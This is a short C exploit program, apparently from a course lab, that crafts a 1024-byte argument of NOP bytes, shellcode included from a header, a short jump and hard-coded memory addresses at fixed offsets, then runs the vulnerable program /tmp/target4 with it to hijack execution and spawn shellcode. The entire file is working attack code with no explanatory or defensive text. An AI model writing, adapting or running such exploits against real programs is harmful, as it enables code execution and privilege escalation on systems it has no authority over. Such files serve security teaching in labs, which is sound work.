#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET  "/tmp/target4"
#define SIZE    1024
#define OFFSET  208
#define NOP     0x90
#define LEN     45
#define LC      "\x78\x98\x05\x08"
#define RC      "\x7c\xfa\xff\xbf"
#define FC      "\x7d\xfa\xff\xbf"

int main(void){
  char *args[3];
  char *env[1];
  char buf[SIZE];

  memset(buf, NOP, SIZE);
  strncpy(buf+2, "\xeb\x04", 2);
  strncpy(buf+4, FC, 4);
  strncpy(buf+OFFSET-LEN, shellcode, LEN);
  strncpy(buf+OFFSET, LC, 4);
  strncpy(buf+OFFSET+4, RC, 4);

  buf[SIZE-1] = 0;    // NULL terminate exploit string

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}